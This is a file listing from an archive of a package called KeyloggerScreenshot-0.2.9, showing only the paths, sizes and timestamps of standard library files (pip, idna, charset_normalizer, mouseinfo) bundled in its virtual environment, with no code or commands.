-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.088295 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/assets/
--rw-rw-rw-   0        0        0    21509 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/assets/__init__.py
--rw-rw-rw-   0        0        0    12944 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/cd.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.113109 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/cli/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/cli/__init__.py
--rw-rw-rw-   0        0        0    10040 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/cli/normalizer.py
--rw-rw-rw-   0        0        0    19596 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/constant.py
--rw-rw-rw-   0        0        0     2125 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/legacy.py
--rw-rw-rw-   0        0        0    18829 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/md.py
--rw-rw-rw-   0        0        0    11829 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/models.py
--rw-rw-rw-   0        0        0    11958 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/utils.py
--rw-rw-rw-   0        0        0       85 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/version.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.078075 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer-3.1.0.dist-info/
--rw-rw-rw-   0        0        0       76 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer-3.1.0.dist-info/entry_points.txt
--rw-rw-rw-   0        0        0       19 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer-3.1.0.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.233090 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/idna/
--rw-rw-rw-   0        0        0      849 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/idna/__init__.py
--rw-rw-rw-   0        0        0     3374 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/idna/codec.py
--rw-rw-rw-   0        0        0      321 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/idna/compat.py
--rw-rw-rw-   0        0        0    12950 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/idna/core.py
--rw-rw-rw-   0        0        0    44375 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/idna/idnadata.py
--rw-rw-rw-   0        0        0     1881 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/idna/intranges.py
--rw-rw-rw-   0        0        0       21 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/idna/package_data.py
--rw-rw-rw-   0        0        0   206539 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/idna/uts46data.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.242649 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/idna-3.4.dist-info/
--rw-rw-rw-   0        0        0     1523 2023-03-16 07:29:54.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/idna-3.4.dist-info/LICENSE.md
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.258311 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/mouseinfo/
--rw-rw-rw-   0        0        0    42960 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/mouseinfo/__init__.py
--rw-rw-rw-   0        0        0       81 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/mouseinfo/__main__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.298324 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/
--rw-rw-rw-   0        0        0      357 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/__init__.py
--rw-rw-rw-   0        0        0     1198 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/__main__.py
--rw-rw-rw-   0        0        0     1444 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/__pip-runner__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.454213 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/
--rw-rw-rw-   0        0        0      573 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/__init__.py
--rw-rw-rw-   0        0        0    10234 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/build_env.py
--rw-rw-rw-   0        0        0    10734 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cache.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.613816 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/
--rw-rw-rw-   0        0        0      132 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/__init__.py
--rw-rw-rw-   0        0        0     6676 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/autocompletion.py
--rw-rw-rw-   0        0        0     7842 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/base_command.py
--rw-rw-rw-   0        0        0    29381 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/cmdoptions.py
--rw-rw-rw-   0        0        0      774 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/command_context.py
--rw-rw-rw-   0        0        0     2472 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/main.py
--rw-rw-rw-   0        0        0     4338 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/main_parser.py
--rw-rw-rw-   0        0        0    10817 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/parser.py
--rw-rw-rw-   0        0        0     1968 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/progress_bars.py
--rw-rw-rw-   0        0        0    18172 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/req_command.py
--rw-rw-rw-   0        0        0     5118 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/spinners.py
--rw-rw-rw-   0        0        0      116 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/cli/status_codes.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.864996 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/
--rw-rw-rw-   0        0        0     3882 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/__init__.py
--rw-rw-rw-   0        0        0     7582 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/cache.py
--rw-rw-rw-   0        0        0     1685 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/check.py
--rw-rw-rw-   0        0        0     4129 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/completion.py
--rw-rw-rw-   0        0        0     9815 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/configuration.py
--rw-rw-rw-   0        0        0     6573 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/debug.py
--rw-rw-rw-   0        0        0     5289 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/download.py
--rw-rw-rw-   0        0        0     2951 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/freeze.py
--rw-rw-rw-   0        0        0     1703 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/hash.py
--rw-rw-rw-   0        0        0     1132 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/help.py
--rw-rw-rw-   0        0        0     4762 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/index.py
--rw-rw-rw-   0        0        0     3374 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/inspect.py
--rw-rw-rw-   0        0        0    31726 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/install.py
--rw-rw-rw-   0        0        0    12343 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/list.py
--rw-rw-rw-   0        0        0     5697 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/search.py
--rw-rw-rw-   0        0        0     6129 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/show.py
--rw-rw-rw-   0        0        0     3680 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/uninstall.py
--rw-rw-rw-   0        0        0     7396 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/commands/wheel.py
--rw-rw-rw-   0        0        0    13529 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/configuration.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.921069 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/distributions/
--rw-rw-rw-   0        0        0      858 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/distributions/__init__.py
--rw-rw-rw-   0        0        0     1221 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/distributions/base.py
--rw-rw-rw-   0        0        0      729 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/distributions/installed.py
--rw-rw-rw-   0        0        0     6494 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/distributions/sdist.py
--rw-rw-rw-   0        0        0     1164 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/distributions/wheel.py
--rw-rw-rw-   0        0        0    20942 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/exceptions.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.968272 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/index/
--rw-rw-rw-   0        0        0       30 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/index/__init__.py
--rw-rw-rw-   0        0        0    16503 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/index/collector.py
--rw-rw-rw-   0        0        0    37596 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/index/package_finder.py
--rw-rw-rw-   0        0        0     6557 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/index/sources.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.018511 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/locations/
--rw-rw-rw-   0        0        0    17552 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/locations/__init__.py
--rw-rw-rw-   0        0        0     6302 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/locations/_distutils.py
--rw-rw-rw-   0        0        0     7867 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/locations/_sysconfig.py
--rw-rw-rw-   0        0        0     2573 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/locations/base.py
--rw-rw-rw-   0        0        0      340 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/main.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.068120 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/metadata/
--rw-rw-rw-   0        0        0     4280 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/metadata/__init__.py
--rw-rw-rw-   0        0        0     2595 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/metadata/_json.py
--rw-rw-rw-   0        0        0    25277 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/metadata/base.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.111504 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/metadata/importlib/
--rw-rw-rw-   0        0        0      107 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/metadata/importlib/__init__.py
--rw-rw-rw-   0        0        0     1882 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/metadata/importlib/_compat.py
--rw-rw-rw-   0        0        0     8181 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/metadata/importlib/_dists.py
--rw-rw-rw-   0        0        0     7457 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/metadata/importlib/_envs.py
--rw-rw-rw-   0        0        0     9773 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/metadata/pkg_resources.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.248217 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/
--rw-rw-rw-   0        0        0       63 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/__init__.py
--rw-rw-rw-   0        0        0      990 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/candidate.py
--rw-rw-rw-   0        0        0     5877 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/direct_url.py
--rw-rw-rw-   0        0        0     2520 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/format_control.py
--rw-rw-rw-   0        0        0     1030 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/index.py
--rw-rw-rw-   0        0        0     2617 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/installation_report.py
--rw-rw-rw-   0        0        0    18083 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/link.py
--rw-rw-rw-   0        0        0      738 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/scheme.py
--rw-rw-rw-   0        0        0     4644 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/search_scope.py
--rw-rw-rw-   0        0        0     1907 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/selection_prefs.py
--rw-rw-rw-   0        0        0     3858 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/target_python.py
--rw-rw-rw-   0        0        0     3600 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/models/wheel.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.338258 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/network/
--rw-rw-rw-   0        0        0       50 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/network/__init__.py
--rw-rw-rw-   0        0        0    12190 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/network/auth.py
--rw-rw-rw-   0        0        0     2145 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/network/cache.py
--rw-rw-rw-   0        0        0     6096 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/network/download.py
--rw-rw-rw-   0        0        0     7638 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/network/lazy_wheel.py
--rw-rw-rw-   0        0        0    18443 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/network/session.py
--rw-rw-rw-   0        0        0     4073 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/network/utils.py
--rw-rw-rw-   0        0        0     1791 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/network/xmlrpc.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.368535 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.463378 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/build/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/build/__init__.py
--rw-rw-rw-   0        0        0     4133 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/build/build_tracker.py
--rw-rw-rw-   0        0        0     1404 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/build/metadata.py
--rw-rw-rw-   0        0        0     1456 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/build/metadata_editable.py
--rw-rw-rw-   0        0        0     2198 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/build/metadata_legacy.py
--rw-rw-rw-   0        0        0     1063 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/build/wheel.py
--rw-rw-rw-   0        0        0     1405 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/build/wheel_editable.py
--rw-rw-rw-   0        0        0     3064 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/build/wheel_legacy.py
--rw-rw-rw-   0        0        0     5109 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/check.py
--rw-rw-rw-   0        0        0     9784 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/freeze.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.508896 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/install/
--rw-rw-rw-   0        0        0       51 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/install/__init__.py
--rw-rw-rw-   0        0        0     1354 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/install/editable_legacy.py
--rw-rw-rw-   0        0        0     4105 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/install/legacy.py
--rw-rw-rw-   0        0        0    27407 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/install/wheel.py
--rw-rw-rw-   0        0        0    25091 2023-03-16 07:26:05.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/operations/prepare.py
--rw-rw-rw-   0        0        0     7074 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/pyproject.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.578352 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/req/
--rw-rw-rw-   0        0        0     2807 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/req/__init__.py
--rw-rw-rw-   0        0        0    16611 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/req/constructors.py
--rw-rw-rw-   0        0        0    17646 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/req/req_file.py
--rw-rw-rw-   0        0        0    35600 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/req/req_install.py
--rw-rw-rw-   0        0        0     2858 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/req/req_set.py
--rw-rw-rw-   0        0        0    24045 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/req/req_uninstall.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.588520 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/__init__.py
--rw-rw-rw-   0        0        0      583 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/base.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.608360 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/legacy/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/legacy/__init__.py
--rw-rw-rw-   0        0        0    24129 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/legacy/resolver.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:33.708456 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/resolvelib/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/resolvelib/__init__.py
--rw-rw-rw-   0        0        0     5220 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/resolvelib/base.py
--rw-rw-rw-   0        0        0    18963 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/resolvelib/candidates.py
--rw-rw-rw-   0        0        0    27878 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/resolvelib/factory.py
--rw-rw-rw-   0        0        0     5705 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/resolvelib/found_candidates.py
--rw-rw-rw-   0        0        0     9914 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/resolvelib/provider.py
--rw-rw-rw-   0        0        0     2526 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/resolvelib/reporter.py
--rw-rw-rw-   0        0        0     5455 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/resolvelib/requirements.py
--rw-rw-rw-   0        0        0    11533 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/resolution/resolvelib/resolver.py
--rw-rw-rw-   0        0        0     8020 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/self_outdated_check.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:34.038569 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/
--rw-rw-rw-   0        0        0        0 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/__init__.py
--rw-rw-rw-   0        0        0     1015 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/_log.py
--rw-rw-rw-   0        0        0     1665 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/appdirs.py
--rw-rw-rw-   0        0        0     1884 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/compat.py
--rw-rw-rw-   0        0        0     5377 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/compatibility_tags.py
--rw-rw-rw-   0        0        0      242 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/datetime.py
--rw-rw-rw-   0        0        0     5764 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/deprecation.py
--rw-rw-rw-   0        0        0     3206 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/direct_url_helpers.py
--rw-rw-rw-   0        0        0     1115 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/distutils_args.py
--rw-rw-rw-   0        0        0     2203 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/egg_link.py
--rw-rw-rw-   0        0        0     1169 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/encoding.py
--rw-rw-rw-   0        0        0     3064 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/entrypoints.py
--rw-rw-rw-   0        0        0     5122 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/filesystem.py
--rw-rw-rw-   0        0        0      716 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/filetypes.py
--rw-rw-rw-   0        0        0     3110 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/glibc.py
--rw-rw-rw-   0        0        0     4831 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/hashes.py
--rw-rw-rw-   0        0        0      795 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/inject_securetransport.py
--rw-rw-rw-   0        0        0    11632 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/logging.py
--rw-rw-rw-   0        0        0    21617 2023-03-16 07:26:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/pip/_internal/utils/misc.py
